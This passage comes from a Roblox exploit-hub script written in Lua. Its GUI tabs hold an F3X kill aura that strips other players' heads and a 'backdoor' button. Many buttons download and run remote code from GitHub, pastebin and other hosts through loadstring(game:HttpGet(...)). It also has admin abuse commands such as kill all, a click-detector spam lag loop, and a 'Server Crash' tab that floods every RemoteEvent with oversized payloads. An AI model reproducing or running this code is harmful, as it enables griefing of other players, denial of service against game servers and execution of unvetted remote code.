                {["Part"] = gHead, ["CFrame"] = headCF * CFrame.new(0, 0.15, 0)},
                {["Part"] = gLArm, ["CFrame"] = char["Left Arm"].CFrame},
                {["Part"] = gRArm, ["CFrame"] = rArm.CFrame},
                {["Part"] = gRLeg, ["CFrame"] = char["Right Leg"].CFrame},
                {["Part"] = gLLeg, ["CFrame"] = char["Left Leg"].CFrame},
                {["Part"] = gScythe, ["CFrame"] = scytheCF},
                {["Part"] = eyeL, ["CFrame"] = headCF * CFrame.new(-0.28, 0.22, -0.62) * CFrame.Angles(0, math.rad(90), 0)},
                {["Part"] = eyeR, ["CFrame"] = headCF * CFrame.new(0.28, 0.22, -0.62) * CFrame.Angles(0, math.rad(90), 0)}
            }})
        end)

        -- ÐšÐ˜Ð›Ð›-ÐÐ£Ð Ð (Ð Ð°Ð´Ð¸ÑƒÑ 3)
        local region = workspace:GetPartBoundsInRadius(scytheCF.Position, 3)
        for _, p in pairs(region) do
            local m = p.Parent
            if m:IsA("Model") and m:FindFirstChild("Humanoid") and m ~= char then
                local targetHead = m:FindFirstChild("Head")
                if targetHead then
                    task.spawn(function()
                        remote:InvokeServer("Remove", {targetHead})
                    end)
                end
            end
        end
    end)

    mouse.Button1Down:Connect(function()
        if not isAttacking then isAttacking = true slashProgress = 0 end
    end)
end

Script_F3X_Goner()
    end    
})

Tab12:AddButton({
    Name = "f3x backdoor",
    Callback = function()
        loadstring(game:HttpGet('https://gist.githubusercontent.com/MRSBLACK999/a1521a41ab1d1b67f5073aacce0bce32/raw/432ed275c41a160eca06ca1ad473a67a50168182/Fe%2520F3x%2520Backdoor%2520Gui'))()
    end    
})

Tab12:AddButton({
    Name = "Soul Reaper F3X",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/CM9/refs/heads/main/Soul_Reaper_F3X.lua"))()
    end    
})

Tab12:AddButton({
    Name = "zoon gui",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/c00lgui-FE-BYPASS/refs/heads/main/all%20script.lua"))()
    end    
})

local Tab13 = Window:MakeTab({
    Name = "HeadAdmin hd",
    Icon = "rbxassetid://9048948650",
    PremiumOnly = false
})

Tab13:AddButton({
    Name = "jail all",
    Callback = function()
        game.Players:Chat(";jail all")
    end    
})

Tab13:AddButton({
    Name = "invisible all",
    Callback = function()
        game.Players:Chat(";invisible all")
    end    
})

Tab13:AddButton({
    Name = "ice all",
    Callback = function()
        game.Players:Chat(";ice all")
    end    
})

Tab13:AddButton({
    Name = "kill all",
    Callback = function()
        game.Players:Chat(";kill all")
    end    
})

Tab13:AddButton({
    Name = "explode all",
    Callback = function()
        game.Players:Chat(";explode all")
    end    
})

Tab13:AddButton({
    Name = "bring all",
    Callback = function()
        game.Players:Chat(";bring all")
    end    
})

Tab13:AddButton({
    Name = "respawn all",
    Callback = function()
        game.Player:Chat(";re all")
    end    
})

Tab13:AddButton({
    Name = "ff all",
    Callback = function()
        game.Players:Chat(";ff all")
    end    
})

Tab13:AddButton({
    Name = "btools all",
    Callback = function()
        game.Players:Chat(";btools all")
    end    
})

Tab13:AddButton({
    Name = "gear all Bombo's Survival Knife",
    Callback = function()
        game.Players:Chat(";gear all 121946387")
    end    
})

Tab13:AddButton({
    Name = "gear all Luger Pistol",
    Callback = function()
        game.Players:Chat(";gear all 95354288")
    end    
})

Tab13:AddButton({
    Name = "gear all Golden Super Fly Boombox",
    Callback = function()
        game.Players:Chat(";gear all 212641536")
    end    
})

Tab13:AddButton({
    Name = "gear all Ronin Katana",
    Callback = function()
        game.Players:Chat(";gear all 12187348")
    end    
})

Tab13:AddButton({
    Name = "gear all Ice Dragon Slayer",
    Callback = function()
        game.Players:Chat(";gear all 168141301")
    end    
})

Tab13:AddButton({
    Name = "gear all Bloxy Cola",
    Callback = function()
        game.Players:Chat(";gear all 10472779")
    end    
})

Tab13:AddButton({
    Name = "gear all Historic 'Timmy' Gun",
    Callback = function()
        game.Players:Chat(";gear all 116693764")
    end    
})

Tab13:AddButton({
    Name = "gear all Teddy Bloxpin",
    Callback = function()
        game.Players:Chat(";gear all 12848902")
    end    
})

Tab13:AddButton({
    Name = "gear all Rainbow Magic Carpet",
    Callback = function()
        game.Players:Chat(";gear all 225921000")
    end    
})

Tab13:AddButton({
    Name = "gear all Body Swap Potion",
    Callback = function()
        game.Players:Chat(";gear all 78730532")
    end    
})

Tab13:AddButton({
    Name = "gear all Fuse Bomb",
    Callback = function()
        game.Players:Chat(";gear all 11563251")
    end    
})

Tab13:AddButton({
    Name = "gear all Ban Hammer",
    Callback = function()
        game.Players:Chat(";gear all 10468797")
    end    
})

Tab13:AddButton({
    Name = "gear all Red Hyperlaser Gun",
    Callback = function()
        game.Players:Chat(";gear all 212296936")
    end    
})

Tab13:AddButton({
    Name = "gear all Subspace Tripmine",
    Callback = function()
        game.Players:Chat(";gear all 11999247")
    end    
})

Tab13:AddButton({
    Name = "gear all Attack Doge",
    Callback = function()
        game.Players:Chat(";gear all 257810065")
    end    
})

Tab13:AddButton({
    Name = "gear all Rainbow Periastron Omega",
    Callback = function()
        game.Players:Chat(";gear all 159229806")
    end    
})

Tab13:AddButton({
    Name = "gear all Godzilla Companion",
    Callback = function()
        game.Players:Chat(";gear all 3130875522")
    end    
})

Tab13:AddButton({
    Name = "gear all Katana",
    Callback = function()
        game.Players:Chat(";gear all 11453385")
    end    
})

Tab13:AddButton({
    Name = "gear all Torch",
    Callback = function()
        game.Players:Chat(";gear all 31839337")
    end    
})

Tab13:AddButton({
    Name = "gear all Ultimate Drive Speedster",
    Callback = function()
        game.Players:Chat(";gear all 253519495")
    end    
})

Tab13:AddButton({
    Name = "gear all Hyperlaser Gun",
    Callback = function()
        game.Players:Chat(";gear all 130113146")
    end    
})

Tab13:AddButton({
    Name = "gear all The Fiery Sun",
    Callback = function()
        game.Players:Chat(";gear all 83021250")
    end    
})

Tab13:AddButton({
    Name = "gear all Moneybag",
    Callback = function()
        game.Players:Chat(";gear all 16722267")
    end    
})

Tab13:AddButton({
    Name = "gear all Cheezburger",
    Callback = function()
        game.Players:Chat(";gear all 16726030")
    end    
})

Tab13:AddButton({
    Name = "gear all The General's .45",
    Callback = function()
        game.Players:Chat(";gear all 97885508")
    end    
})

Tab13:AddButton({
    Name = "gear all Skeleton Scythe",
    Callback = function()
        game.Players:Chat(";gear all 95951330")
    end    
})

Tab13:AddButton({
    Name = "gear all Sword of the Epicredness",
    Callback = function()
        game.Players:Chat(";gear all 409745306")
    end    
})

Tab13:AddButton({
    Name = "gear all Kylo Ren’s Lightsaber",
    Callback = function()
        game.Players:Chat(";gear all 1208300505")
    end    
})

Tab13:AddButton({
    Name = "gear all Scythe",
    Callback = function()
        game.Players:Chat(";gear all 28275809")
    end    
})

Tab13:AddButton({
    Name = "gear all Flashbang",
    Callback = function()
        game.Players:Chat(";gear all 16979083")
    end    
})

Tab13:AddButton({
    Name = "gear all Trench Warfare Shotgun",
    Callback = function()
        game.Players:Chat(";gear all 94233344")
    end    
})

Tab13:AddButton({
    Name = "gear all Noir Periastron Psi",
    Callback = function()
        game.Players:Chat(";gear all 120307951")
    end    
})

Tab13:AddButton({
    Name = "gear all Grapple Hook",
    Callback = function()
        game.Players:Chat(";gear all 30393548")
    end    
})

Tab13:AddButton({
    Name = "gear all Azure Periastron Alpha",
    Callback = function()
        game.Players:Chat(";gear all 69499437")
    end    
})

Tab13:AddButton({
    Name = "gear all Crimson Periastron Mu",
    Callback = function()
        game.Players:Chat(";gear all 99119240")
    end    
})

Tab13:AddButton({
    Name = "gear all Dracovin Spell Book",
    Callback = function()
        game.Players:Chat(";gear all 49491736")
    end    
})

Tab13:AddButton({
    Name = "gear all Ivory Periastron",
    Callback = function()
        game.Players:Chat(";gear all 108158379")
    end    
})

Tab13:AddButton({
    Name = "gear all Dark Spellbook of the Forgotten",
    Callback = function()
        game.Players:Chat(";gear all 56561579")
    end    
})

Tab13:AddButton({
    Name = "gear all Zombie Staff",
    Callback = function()
        game.Players:Chat(";gear all 26421972")
    end    
})

Tab13:AddButton({
    Name = "gear all Pepperoni Pizza",
    Callback = function()
        game.Players:Chat(";gear all 22596452")
    end    
})

Tab13:AddButton({
    Name = "gear all Crescendo, The Soul Stealer",
    Callback = function()
        game.Players:Chat(";gear all 94794774")
    end    
})

Tab13:AddButton({
    Name = "gear all BB-8",
    Callback = function()
        game.Players:Chat(";gear all 1183007014")
    end    
})

Tab13:AddButton({
    Name = "gear all Snowball",
    Callback = function()
        game.Players:Chat(";gear all 19328185")
    end    
})

Tab13:AddButton({
    Name = "gear all Golden Steampunk Gloves",
    Callback = function()
        game.Players:Chat(";gear all ")
    end    
})

Tab13:AddButton({
    Name = "gear all Red Convertible",
    Callback = function()
        game.Players:Chat(";gear all 164207580")
    end    
})

Tab13:AddButton({
    Name = "gear all Deluxe Rainbow Magic Carpet",
    Callback = function()
        game.Players:Chat(";gear all 477910063")
    end    
})

Tab13:AddButton({
    Name = "gear all Sword of Darkness",
    Callback = function()
        game.Players:Chat(";gear all 77443491")
    end    
})

Tab13:AddButton({
    Name = "gear all R-80",
    Callback = function()
        game.Players:Chat(";gear all 12562495")
    end    
})

Tab13:AddButton({
    Name = "gear all Galactic Laser Gun",
    Callback = function()
        game.Players:Chat(";gear all 168143042")
    end    
})

local Tab14 = Window:MakeTab({
    Name = "Script Not fe, script/Gui",
    Icon = "rbxassetid://9048948650",
    PremiumOnly = false
})

Tab14:AddButton({
    Name = "c00lgui",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/c00lgui-FE-BYPASS/refs/heads/main/c00lgui"))()
    end    
})

Tab14:AddButton({
    Name = "John Doe",
    Callback = function()
        loadstring(game:HttpGet(('https://pastefy.ga/NRS9eVcp/raw'),true))()
    end    
})

Tab14:AddButton({
    Name = "Rc7 Real Gui",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/Nxjb9ywE"))()
    end    
})

Tab14:AddButton({
    Name = "grab knife v4",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/retpirato/Roblox-Scripts/refs/heads/master/Grab%20Knife%20V4.lua"))()
    end    
})

local Tab15 = Window:MakeTab({
    Name = "Part Controller Best script",
    Icon = "rbxassetid://1",
    PremiumOnly = false
})

Tab15:AddButton({
    Name = "Part Controller",
    Callback = function()
        pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PartController/refs/heads/main/PartController.lua", true))()
end)
    end    
})

Tab15:AddButton({
    Name = "Super Ring Part V3",
    Callback = function()
       loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/a58bbcddf179c627b22eab93e3a95ffb"))() 
    end    
})

Tab15:AddButton({
    Name = "bring part by Arceus X",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))("More Scripts: t.me/arceusxscripts")
    end    
})

Tab15:AddButton({
    Name = "Unenchored part Control",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/Unachored_parts_controller_v2.lua.txt"))()
    end    
})

Tab15:AddButton({
    Name = "Telekinesis V5",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Telekinesis-V5-21542"))()
    end    
})

local Tab16 = Window:MakeTab({
    Name = "Hat Script",
    Icon = "rbxassetid://1",
    PremiumOnly = false
})

Tab16:AddButton({
    Name = "Fe Snake Hat",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/qwertys/refs/heads/main/qwerty4.lua"))()
    end    
})

Tab16:AddButton({
    Name = "Fe Hat Orbit",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShutUpJamesTheLoserAlt/hatspin/refs/heads/main/hat"))()
    end
})

local Tab17 = Window:MakeTab({
    Name = "Play Skybox By Chris & Rixer95-x2 Chxris",
    Icon = "rbxassetid://1",
    PremiumOnly = false
})

Tab17:AddButton({
    Name = "Skybox Gui By Chris & Rixer95-x2, Chxris",
    Callback = function()
        loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/461565640e2f7fc635b82bd72f6301da"))()
    end
})

local Tab18 = Window:MakeTab({
    Name = "Natural Disaster",
    Icon = "rbxassetid://75756933857153",
    PremiumOnly = false
})

Tab18:AddButton({
    Name = "Fe Making all people Noob (LAG)",
    Callback = function()
        local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer

pcall(function()
    local pp = CoreGui:FindFirstChild("PurchasePromptApp")
    if pp then pp:Destroy() end
end)

pcall(function()
    local pg = player:FindFirstChild("PlayerGui") or player.PlayerGui
    if pg then
        local mg = pg:FindFirstChild("MainGui")
        if mg and mg:FindFirstChild("HoverSound") then
            mg.HoverSound.Volume = 0
        end
    end
end)

pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "Made by V0C0N1337",
        Text = "script executed if players die look players LMAO",
        Duration = 7
    })
end)

local function clickBalloonAndApple(spamCount)
    local balloon = Workspace:FindFirstChild("BillboardBalloon")
    local apple = Workspace:FindFirstChild("BillboardApple")
    local balloonClick = balloon and balloon:FindFirstChild("Board") and balloon.Board:FindFirstChildOfClass("ClickDetector")
    local appleClick = apple and apple:FindFirstChild("Board") and apple.Board:FindFirstChildOfClass("ClickDetector")
    if balloonClick then
        task.spawn(function()
            for i=1, (spamCount or 25000) do
                fireclickdetector(balloonClick)
                if i % 50 == 0 then task.wait() end
            end
        end)
    end
    if appleClick then
        task.spawn(function()
            for i=1, (spamCount or 25000) do
                fireclickdetector(appleClick)
                if i % 50 == 0 then task.wait() end
            end
        end)
    end
end

clickBalloonAndApple(30000)
    end
})

local Tab19 = Window:MakeTab({
    Name = "Server Crash/Lag Method",
    Icon = "rbxassetid://0",
    PremiumOnly = false
})

Tab19:AddButton({
    Name = "Server Crash Method 1",
    Callback = function()
        local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local me = Players.LocalPlayer


local remoteList = {}
for _, r in pairs(RS:GetDescendants()) do
    if r:IsA("RemoteEvent") then
        table.insert(remoteList, r)
    end
end


local function targetCrash(targetPlayer)
    spawn(function()
        while wait(0.5) do
            for _, r in pairs(remoteList) do
                pcall(function()
                    r:FireServer(
                        string.rep("a", 10000),
                        {targetPlayer.Character or workspace:FindFirstChild(targetPlayer.Name)},
                        Vector3.new(1e9, 1e9, 1e9)
                    )
                end)
            end
        end
    end)
end


for _, plr in pairs(Players:GetPlayers()) do
    if plr ~= me then
        targetCrash(plr)
    end
			end
			
    end
})

Tab19:AddButton({
    Name = "Server Crash Method 2",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/robloxfeservercrashxdxdezbypsssed.txt"))()
    end
})

Tab19:AddButton({
    Name = "Server Crash Method 3",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/servercrashv3.lua.txt"))()
    end
})
